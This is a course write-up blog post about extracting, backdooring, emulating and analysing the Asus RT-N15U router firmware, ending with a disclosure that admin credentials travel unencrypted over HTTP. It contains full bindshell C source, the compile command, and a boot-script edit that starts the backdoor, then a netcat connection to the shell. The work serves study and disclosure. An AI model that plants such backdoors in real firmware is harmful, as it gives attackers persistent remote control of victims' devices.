---
layout: post
title: "Asus RT-N15U Firmware Analysis"
description: "For the next firmware analysis task of the Offensive Internet Of Things Exploitation final project, I decided to analyze the Asus RT-N15U firmware version 3.0.0.4.376.3754. The following is the process I used to backdoor, emulate, and analyze this firmware as well as any security issues I could find."
tags: [firmware, asus, reverse-engineering]
---

This blog post has been created for completing the requirements of the
SecurityTube Offensive Internet of Things course.

[Offensive Internet Of Things Exploitation](http://www.securitytube-training.com/online-courses/offensive-internet-of-things-exploitation/index.html)

Student ID: IoTE- 778

## Overview

For the next firmware analysis task of the
[Offensive Internet Of Things Exploitation](http://www.securitytube-training.com/online-courses/offensive-internet-of-things-exploitation/index.html)
final project, I decided to analyze the Asus RT-N15U firmware version
3.0.0.4.376.3754. The following is the process I used to backdoor,
emulate, and analyze this firmware as well as any security issues I
could find.

## Process

The process that I followed to analyze this firmware was to:

- Download the firmware from the Asus website
- Use the
  [Firmware Mod Kit](https://github.com/rampageX/firmware-mod-kit) to
  extract the firmware
- Perform offline analysis of the unpackaged firmware looking for
  security vulnerabilities
- Find out what architecture and endianness the firmware binaries were
  compiled against
- Find out how a backdoor could be integrated
- Compile a backdoor for the correct architecture and endianness using
  [Buildroot](https://buildroot.uclibc.org/)
- Integrate the compiled backdoor
- Re-build the firmware using [Firmware Mod Kit](https://github.com/rampageX/firmware-mod-kit)
- Use the
  [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit)
  / [Firmadyne](https://github.com/firmadyne/firmadyne) to emulate the
  firmware
- Verify that the implemented backdoor could be accessed
- Perform online vulnerability analysis of the running firmware

## Acquiring The Firmware

The firmware that I used for this project was downloaded from Asus's
website
[here](https://www.asus.com/Networking/RTN15U/HelpDesk_Download/).


![Asus RT-N15U Firmware Download](/assets/Firmware/RTN15UFirmwareDownload.png)

## Offline Analysis Of The Asus RT-N15U Firmware

Now that the firmware had been acquired, the next step was to extract
it and start analyzing it. To extract the
[Firmware Mod Kit](https://github.com/rampageX/firmware-mod-kit) was
leveraged as such:

    oit@ubuntu:~/tools/firmware-mod-kit$ ./extract-firmware.sh FW_RT_N15U_30043763754.trx

This provided an extracted firmware directory structure that looked like the following:

	oit@ubuntu:~/tools/firmware-mod-kit/FW_RT_N15U_30043763754/rootfs$ ls -la
	total 80
	drwxr-xr-x 18 root root  4096 Jul 19 14:47 .
	drwxrwxr-x  5 oit  oit   4096 Jul 19 15:22 ..
	drwxr-xr-x  2 root root  4096 Jan 10  2015 asus_jffs
	drwxr-xr-x  2 root root  4096 Jan 10  2015 bin
	drwxr-xr-x  2 root root  4096 Jan 10  2015 cifs1
	drwxr-xr-x  2 root root  4096 Jan 10  2015 cifs2
	drwxr-xr-x  2 root root  4096 Jan 10  2015 dev
	lrwxrwxrwx  1 root root     7 Jul 19 06:42 etc -> tmp/etc
	lrwxrwxrwx  1 root root     8 Jul 19 06:42 home -> tmp/home
	drwxr-xr-x  2 root root  4096 Jan 10  2015 jffs
	drwxr-xr-x  3 root root  4096 Jan 10  2015 lib
	drwxr-xr-x  2 root root  4096 Jan 10  2015 mmc
	lrwxrwxrwx  1 root root     7 Jul 19 06:42 mnt -> tmp/mnt
	lrwxrwxrwx  1 root root     7 Jul 19 06:42 opt -> tmp/opt
	drwxr-xr-x  2 root root  4096 Jan 10  2015 proc
	drwxr-xr-x  3 root root  4096 Jul 19 14:47 rom
	lrwxrwxrwx  1 root root    13 Jul 19 06:42 root -> tmp/home/root
	drwxr-xr-x  2 root root  4096 Jul 19 14:47 sbin
	drwxr-xr-x  2 root root  4096 Jan 10  2015 sys
	drwxr-xr-x  2 root root  4096 Jan 10  2015 sysroot
	drwxr-xr-x  2 root root  4096 Jan 10  2015 tmp
	drwxr-xr-x  6 root root  4096 Jan 10  2015 usr
	lrwxrwxrwx  1 root root     7 Jul 19 06:42 var -> tmp/var
	drwxr-xr-x 11 root root 12288 Jan 10  2015 www

Through manual code review I did not find any confirmed security issues.

### Architecture and Endianness

To determine the architecture and endianness that the firmware uses, I
used `sudo readelf -a usr/sbin/httpd`. This gave:

	ELF Header:
	  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00
	  Class:                             ELF32
	  Data:                              2's complement, little endian
	  Version:                           1 (current)
	  OS/ABI:                            UNIX - System V
	  ABI Version:                       0
	  Type:                              EXEC (Executable file)
	  Machine:                           MIPS R3000
	  Version:                           0x1
	  Entry point address:               0x403140
	  Start of program headers:          52 (bytes into file)
	  Start of section headers:          229488 (bytes into file)
	  Flags:                             0x50001007, noreorder, pic, cpic, o32, mips32
	  Size of this header:               52 (bytes)
	  Size of program headers:           32 (bytes)
	  Number of program headers:         8
	  Size of section headers:           40 (bytes)
	  Number of section headers:         28
	  Section header string table index: 27

    .. snip ..

From this output we can determine that the architecture is mips32 and
that the binary is little endian. Armed with this knowledge a backdoor
that will be compatible with this firmware can be built.

## Compile A Backdoor For Mips Little Endian Arthitecture

Now that the architecture and endianness was known, a backdoor could
be built that is compatible with the RT-N15U firmware. The backdoor that was
provided during the course was used once again for this project. This
backdoor is reproduced below:

{% highlight c %}

/* Bindshell for Embedded system running Busybox
Author - Vivek Ramachandran
http://pentesteracademy.com
http://securitytube-training.com
http://securitytube.net

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define SERVER_PORT	9999
int main() {
	int serverfd, clientfd, server_pid, i = 0;
	char *banner = "[~] Welcome to @OsandaMalith's Bind Shell\n Welcome to Offensive IoT Exploitation\n";
	char *args[] = { "/bin/busybox", "sh", (char *) 0 };
	struct sockaddr_in server, client;
	socklen_t len;

	server.sin_family = AF_INET;
	server.sin_port = htons(SERVER_PORT);
	server.sin_addr.s_addr = INADDR_ANY;

	serverfd = socket(AF_INET, SOCK_STREAM, 0);
	bind(serverfd, (struct sockaddr *)&server, sizeof(server));
	listen(serverfd, 1);

    while (1) {
    	len = sizeof(struct sockaddr);
    	clientfd = accept(serverfd, (struct sockaddr *)&client, &len);
        server_pid = fork();
        if (server_pid) {
        	write(clientfd, banner,  strlen(banner));
	        for(; i <3 /*u*/; i++) dup2(clientfd, i);
	        execve("/bin/busybox", args, (char *) 0);
	        close(clientfd);
    	} close(clientfd);
    } return 0;
}

{% endhighlight %}

This bindshell binds to port 9999 and waits for a connection.

The next task is compiling the backdoor for a MIPS little endian
architecture. We can do this using
[buildroot](https://buildroot.uclibc.org/). After copying the
bindshell into buildroot we statically compile with gcc using:

	./mipsel-buildroot-linux-uclibc-gcc bindshell.c -static -o bindshell

And then test the bindshell using qemu for the correct architecture:

    sudo chroot . ./qemu-mipsel-static bindshell

	oit@ubuntu:~/tools/fat$ netstat -antp
	(Not all processes could be identified, non-owned process info
	 will not be shown, you would have to be root to see it all.)
	Active Internet connections (servers and established) 
	Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
	tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -
	tcp        0      0 0.0.0.0:9999            0.0.0.0:*               LISTEN      -
	tcp        0      0 127.0.1.1:53            0.0.0.0:*               LISTEN      -
	tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -    
	tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -
	tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      -
	tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -
	tcp6       0      0 :::139                  :::*                    LISTEN      -
	tcp6       0      0 :::22                   :::*                    LISTEN      -
	tcp6       0      0 :::445                  :::*                    LISTEN      -


	Connection to 127.0.0.1 9999 port [tcp/*] succeeded!
	[~] Welcome to @OsandaMalith's Bind Shell

So the firmware seems to run properly... Now how to integrate so it
starts up when the router boots?


## Integrating The Backdoor

Integrating the backdoor turned out to be more difficult than the
previous firmware analysis. This firmware did not have an `etc/init.d`
directory of scripts. I performed a bunch of trial and error of
integrating the bindshell into various scripts that seemed like they
would be called during the boot process based upon their content but
after re-building the firmware and testing, they didn't end up
working. What ended up working was looking at the log output of
Firmadyne. In the logs I found:


	[  135.616000] firmadyne: open[PID: 229 (webs_update.sh)]: file:/firmadyne/libnvram.so
	[  135.616000] firmadyne: close[PID: 229 (webs_update.sh)]: fd:3
	.. snip ..

It seemed that the webs_update.sh script was getting called during
boot. This script was found in `usr/sbin`. I placed the bindshell in
the `usr/sbin` directory as well, and I proceeded to update that
`webs_update.sh` like so:

	cat usr/sbin/webs_update.sh
	#!/bin/sh

	touch /var/log/output
	echo "yea buddy!!!!!!!!!!!!" > /var/log/output
	/usr/sbin/bindshell &

	wget_timeout=`nvram get apps_wget_timeout`
	#wget_options="-nv -t 2 -T $wget_timeout --dns-timeout=120"
	wget_options="-q -t 2 -T $wget_timeout"

	.. snip ..

Did it work out???


## Rebuild, Emulate, and Verify The Backdoored Firmware

To rebuild the modified firmware was just a matter of using the
firmware-mod-kit again:

	$ ./build-firmware.sh FW_RT_N15U_30043763754 -nopad -min

	$ mv FW_RT_N15U_30043763754/new-firmware.bin ~/tools/fat/fwfirmware.bin

The firmware was emulated using the Firmware Analysis Toolkit / Firmadyne

	oit@ubuntu:~/tools/fat$ ./fat.py

		Welcome to the Firmware Analysis Toolkit - v0.1
		Offensive IoT Exploitation Training  - http://offensiveiotexploitation.com
		By Attify - https://attify.com  | @attifyme

    .. snip ..

	Setting up the network connection
	Password for user firmadyne:
	qemu: terminating on signal 2 from pid 5030
	Querying database for architecture... mipsel
	Running firmware 4: terminating after 120 secs...
	Inferring network...
	Interfaces: [('br0', '192.168.1.1')]
	Done!

	Running the firmware finally :


Test to see if the bindshell is listening on port 9999:

	$ nmap 192.168.1.1

	Starting Nmap 6.40 ( http://nmap.org ) at 2017-07-19 15:26 PDT
	mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
	Nmap scan report for 192.168.1.1
	Host is up (0.11s latency).
	Not shown: 996 closed ports
	PORT     STATE SERVICE
	80/tcp   open  http
	515/tcp  open  printer
	9100/tcp open  jetdirect
	9999/tcp open  abyss


Connect to our bindshell and verify that it works:


	$ nc -nv 192.168.1.1 9999
	Connection to 192.168.1.1 9999 port [tcp/*] succeeded!
	[~] Welcome to @OsandaMalith's Bind Shell

	cat /var/log/output
	yea buddy!!!!!!!!!!!!

	uname -a
	Linux (none) 2.6.32.70 #1 Thu Feb 18 01:44:57 UTC 2016 mips GNU/Linux

	ls -la
	drwxr-xr-x   20 1000     1000          4096 Jul 19  2017 .
	drwxr-xr-x   20 1000     1000          4096 Jul 19  2017 ..
	drwxr-xr-x    2 1000     1000          4096 Jan 10  2015 asus_jffs
	drwxr-xr-x    2 1000     1000          4096 Jan 10  2015 bin
	drwxr-xr-x    2 1000     1000          4096 Jan 10  2015 cifs1
	drwxr-xr-x    2 1000     1000          4096 Jan 10  2015 cifs2
	drwxrwxrwt    4 admin    root          4100 Dec 31 16:02 dev
	lrwxrwxrwx    1 1000     1000             7 Jul 19  2017 etc -> t

    .. snip ..

So it turned out the backdoored firmware was indeed running
successfully and provided a backdoor on port 9999.


## Online Analysis

Now that the firmware was running I analyzed the firmware from the UI
to determine if any vulnerabilities could be found. There were a few
potential candidates for things I felt could lead to security
vulnerabilities but most lead to deadends. There was 1 vulnerability
however that I did find, confirmed, and reported to Asus. This issue
was already a known issue to Asus and said that it has been patched in
modern routers as this router has been EOL. The vulnerability is as follows:


## Vulnerability: No Encryption Of Administration Requests / Responses

While interacting with this firmware I noticed that the UI was making
frequent AJAX requests to the backend webserver. Along with each
request was HTTP Basic Authentication credentials. It occurred to me
that this was occurring over port 80 with no usage of SSL/TLS. This
means that anyone on the network sniffing traffic when an
administrator is making configuration changes could intercept the
admin credentials. What makes this even more interesting is that the
credentials are not just sent during login or subsequent page
refreshes, but every few seconds in a polling ajax request. This
greatly increases the chances of interception as while an admin is
making changes, the credentials would get broadcasted many
times. Since HTTP Basic credentials are only Base64 encoded, decoding
to reveal the credentials is trivial:

![Asus RT-N15U ajax_status.xml requests](/assets/Firmware/RTN15USplashWithFirmwareVersionAndCreds.png)
![Intercepted HTTPBasic Auth Credentials](/assets/Firmware/RTN15UWiresharkCapture.png)
![Decoding HTTPBasic Auth Credentials](/assets/Firmware/RTN15UDecode.png)

I contacted Asus about this issue just to make sure that it was known
before I published anything on it and they responded saying has been
reported by others and is a known issue. They stated that the RT-N15U
was EOL so a fix was never created for this router but that newer
routers, and their firmwares do not have the same issue. They said
that they will consider re-opening RT-N15U and provide me a
firmware. I'm not sure if that just means making a patched firmware
for me and others who ask for it, or if they would make it available
on their website. Based on the fact that others have reported this
issue in the past, and they have never acted upon it, I believe it is
safe to disclose this vulnerability as this was not news to them.

